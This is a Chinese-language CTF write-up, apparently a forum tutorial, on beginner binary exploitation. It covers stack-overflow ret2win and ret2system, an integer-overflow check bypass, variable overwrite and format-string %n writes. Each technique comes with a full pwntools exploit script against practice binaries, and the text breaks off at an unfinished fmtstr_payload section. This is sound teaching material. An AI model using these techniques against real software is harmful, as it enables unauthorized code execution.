
# [原创]入门栈溢出和格式化字符串覆盖

title: 栈溢出和格式化字符串(图片看不见的话请各位师傅开VPN或者用流量)

# 简单栈溢出和简单格式化字符串覆盖例题

以下是我花两天时间做的一些题目，选了几道来做笔记以备后用

先来看最简单的

## 后门类无防护夺权

![1.jpg](upload/attach/202103/921599_RQ92QV35MDW65B9.jpg)

F5反汇编后看见有`gets`函数然后看了看plt表我们发现了个`fun`函数

![2.jpg](upload/attach/202103/921599_KEJW57ZSFGXJMR6.jpg)

发现了`bin/sh`那我们就直接利用栈溢出漏洞

![3.jpg](upload/attach/202103/921599_SFMK7KCM33FRKBK.jpg)

点击`v4`看见其地址为`0X0F`

之后找到`fun`函数的地址

![4.jpg](upload/attach/202103/921599_ZCAQ8S9B9Z433KC.jpg)

由此`payload`便可以开始构建了

`payload=b'a'*(0x0f+0x08)+p64(0x0401186)`

完整`exp`如下

```python
from pwn import *
#r=remote("node3.buuoj.cn",26551)
r=process('./pwn1')
payload=b'a'*(0x0F+0x08)+p64(0x0401186)
r.sendline(payload)
r.interactive()
```

执行脚本`cat flag` 就OK啦

## 字符串替换类栈溢出

这个题是C++编写的我就遇见过一次，蛮好玩的，开始不认真还不会呢

题源

上图看反汇编伪代码

![5.jpg](upload/attach/202103/921599_UHV4UMNFYCK26FE.jpg)

这主函数是非常干净啊我们去看子函数`vuln`

![6.jpg](upload/attach/202103/921599_VEU5ZRV3BSQMMRC.jpg)

这里重点在于我箭头所指向的两行代码，输入`I`全部会替换成`you`

我们在看看`fgets`函数那对变量`s`限制输入32个字母，看注释可以知道

`s`的空间大小是60，刚好上面`I`替换`you`可以利用下

我们输入20个`I`就可以使其造成栈溢出

点击`s`可以看见`s`地址（我就懒得弄了直接上`payload`）

`get_flag=0x08048fd`#这个函数里面有`cat flag.txt`

`payload=b'I'*20+b'a'*4+p32(get_flag)`

所以完成`exp`如下

```python
from pwn import *
r=process('./tihuan')
get_flag=0x08048fd#这个函数里面有cat flag.txt
payload=b'I'*20+b'a'*4+p32(get_flag)
r.sendline(payload)
r.interactive()
```

## 虚假后门类

第一种后门类他是有可以直接点

第二种虚假后门就要多花上几秒钟

先看主函数

![7.png](upload/attach/202103/921599_...)

一如既往的空空如也关键的在于`vul`和`door`函数

后门类的`door`直接就抓取`flag`了这里就比较皮┗|｀O′|┛ 嗷~~

![8.jpg](upload/attach/202103/921599_CV2CQR67GBT7HNY.jpg)

遇见这个我们思路就是先看看他有没有`/bin/sh`

同时按下`shift F12`可以查找有没有`bin/sh`

刚好这题有（要没有我这菜鸡现在还做不来）

![9.png](upload/attach/202103/921599_YT3H6YZWHYCVYQW.jpg)

然后双击查看其地址

![10.jpg](upload/attach/202103/921599_GPXU4S49HDBD4J3.jpg)

`bin=0x0804a02c`

我们接下来再看看 `__system`的地址(这里要注意还有一个`system`那个不是我们要的我们要的是`__system`)

如图

![11.jpg](upload/attach/202103/921599_TBQ7WBGYERB8YH3.jpg)

`__system=0x08048400`

之后我们回到`vul`函数看`gets`函数里面变量的地址

![12.jpg](upload/attach/202103/921599_S9VRZWCYJ8NX77P.jpg)

so 直接上`exp`:

```python
from pwn import *
#r=remote("49.234.71.236",28000)
r.process('./ks4')
r.recvuntil("ID:")
r.sendline('aaa')
r.recvuntil("PW:")
payload=b'a'*(0x0d0+0x04)+p32(0x08048400)+p32(0xdeadbeef)+p32(0x0804a02c)
"""0xdeadbeef是用来返回的时候任意地址跳转用的(这个看情况用不是所有的栈溢出题都要的，具体下次写文章总结)"""
r.sendline(payload)
r.interactive()
```

## 数字覆盖类栈溢出

这个题是我在靶场随便扒拉的一个，我先讲解这个然后攻防世界有类似的

`pwn`的新手区 第三题 `when did you born`有兴趣的自己去康康

下面开始讲解

![13.jpg](upload/attach/202103/921599_E3TF3FZ7ZRVTR3U.jpg)

主函数比较特殊的就`func`函数我们先去康康

![14.jpg](upload/attach/202103/921599_84TXCXA2AE5ZHBW.jpg)

可以看见啊这个`v2`是`float`型 `v1`int型

然后`gets`是`v1`但是判断要用`v2`才可以判断

很多萌新就不懂 这个，但是今天我马保国(不是)就来讲讲

我们点击 `v1`看看他的地址`0x030`

`v2`地址`0x04`

虽然我们输入用的变量是`v1`但是我们可以填充字符跳到`v2`去啊

然后再传递题目要的`11.28125`

这个是要转成16进制的

这里给大家个网站很方便

直接上`exp`了

```python
from pwn import *
#r=process('./cq')
r=remote('node3.buuoj.cn',29527)
r.recvuntil("Let's guess the number.")
payload=b'a'*(0x030-0x04)+p64(0x41348000)
r.sendline(payload)
r.interactive()
```

## 绕过字符大小条件限制类栈溢出

说道这个我就很气自己C语言不老实学基础空中楼阁

看见无符号整形`unsigned_int8`还想不起来它最大长度是255（1111 1111）

好了咱进入正题

上主函数图

![15.png](upload/attach/202103/921599_5VVNAC94GD6JAJG.jpg)

第一眼就看中了这个名字检查函数

不过我们先看看这个`buf`数组看注释给了408长度但是这个名字检查函数限定只能用400个长度这里不能搞事情

我们把注意力放到这个名字检查函数上

点击进去康康嗷

![16.png](upload/attach/202103/921599_AAFSJQ4ZZGUFAV9.jpg)

关于`unsigned_int8`

这里补充一点知识

![image-20200326154118709](upload/attach/202103/921599_SJRX2JRMJUCE6WT.jpg)

如图所示嗷

好了咱继续，可以看见函数图里面`if`判断`v3`只能在4~7之间

我们的`v3`上限是255

那么想要整形溢出范围就要控制在259~262之间的字符长度来填充

这里先放着记着这点

接下来我们去看这个函数底部`strcpy`函数把`s`的值给到`dest`

我们去康康`dest`地址

![17.png](upload/attach/202103/921599_ZTHXBEFZ9DM2TSF.jpg)

`dest`离返回地址距离`0x011+0x04=0x015`

然后老样子捞个后门上来玩玩

![18.png](upload/attach/202103/921599_Y623S5NU3AGSHGC.jpg)

`getshell=0x0804858b`

然后我直接上`payload`先讲解下这个`payload`构建

`payload=b'a'*(0x011+0x04)+p32(0x0804858b)+b'a'*(261-0x015-4)`

首先字符串填充然后传入后门地址这两个没什么好说的，重点是后门的那块

用来绕过`if`判断的整型溢出的字符串填充

我们上面提到了判断后范围应当在259-262之间我选261

刚才填充了21个`a`覆盖到返回地址然后传入4个字节的`getshell`

（`0x8b 0x85 0x04 0x08`）

所以要先回到传入地址再减去这四个字节来绕过`if`判断

说完了直接上`exp`

```python
from pwn import *
#r=remote("node3.buuoj.cn",28682)
r=process('./r2t3')
payload=b'a'*(0x011+0x04)+p32(0x0804858b)+b'a'*(261-0x015-4)
r.sendline(payload)
print(r.recv())
r.interactive()
```

## 格式化字符串最简单的一道题

先来道长信心的题目(我入坑没碰见这么长信心的题)

format1

来看看主函数`QWQ`

![19.png](upload/attach/202103/921599_2M9YG6AUGCTBZBW.jpg)

一眼望去只有那个`printf`不对劲但是又没什么函数利用

然后我就看看有没有`bin/sh`之类的果然有个`flag`可是没有后门

我就直接按常规路子走一趟了

![20.png](upload/attach/202103/921599_2YX6UQA2GGTCN4D.jpg)

先连接上看看

![21.png](upload/attach/202103/921599_DKMRZ2S33D2K4PE.jpg)

直接很常规的啦本来想看可利用变量的偏移值结果直接给我爆装备了

## 简单格式化字符串题目

有一说一目前碰见的格式化字符串我都是用一个函数搞定的，

我先不说卖个关子，先来常规写法

### 大数覆盖类

这题在攻防世界`pwn`新手区`CGFSB`我拿这个举例子吧

![22.png](upload/attach/202103/921599_BF7U9FSMXHB83CU.jpg)

主函数内容是输入两次数据输出两次并且有个抓取`flag`的判断

第二次输出的`massage`那个有格式化字符串漏洞整他丫的

先连接上常规探查下

![23.png](upload/attach/202103/921599_45H4BFR2E6BWTTS.jpg)

`%p`作用在于输出地址方便查看可利用变量的偏移值

`aaa`对应就是`0x20616161`这个从左数到他共10个（包括他本身哦）

所以偏移为10

然后我们要利用的变量是`pwnme`所以我们去找他的地址

`pwnme=0x0804a068`这个家伙是4个字节的

题目要求是8所以后面要加上4个字符凑数，然后再利用任意地址读取修改

`payload=p32(pwnme)+b'a'*4+b'%10$n'`

exp

```python
from pwn import *
r=process('./cgfsb')
r.recvuntil("please tell me your name:")
r.sendline('aaa')
r.recvuntil("leave your message please:")
payload=p32(pwnme)+b'a'*4+b'%10$n'
r.sendline(payload)
r.interactive()
```

### 小数覆盖

小数覆盖比较不一样

所谓小数覆盖就是比如我判断变量地址是4，结果好家伙要求来个2才满足判断，这个时候

你不能疯狂加了吧，而且`python`语法没有字符串的减法!

我先上段资料

相关知识覆盖小数字这里都有

例题地址 format5

上主函数图

![24.png](upload/attach/202103/921599_YWXPB6Y4F3JS8B6.jpg)

如图`v2=0x0804a06c`(四字节，题目要求`v2=2`哇哦自闭了刚开始)

如果`v2=2`直接输出`flag`

我们先常规探查，发现可利用变量`buf`偏移值为6先记下

![25.png](upload/attach/202103/921599_23NC6AWH3TSX7ZD.jpg)

然后因为这个小数字覆盖的特殊性

`payload=b'aa%8$naa'+p32(v2)`

其中任意地址读取这个必须放开头

然后虽然一开始我们查看到偏移值是6 按道理应该是

`'aa%6$naa'` 变成8是因为题目要求是`v2=2`

我们添加两个字符作为值传递，那么就会占位所以后移动2个

就是`'aa%8$naa'`这样了

小数覆盖通用任意地址读取通用格式

`'要求字符数量%$（原偏移量+要求字符数量）n要求字符数量'`

上完整`exp`

```python
from pwn import *
r=remote("49.234.71.236",28624)
r.recvuntil("input:")
payload=b'aa%8$naa'+p32(0x0804a06c)
r.sendline(payload)
r.interactive()
```

### 万金油简单格式化字符串

介绍个格式化字符串利器`fmtstr_payload()`

先上例题讲解用法

先看主函数
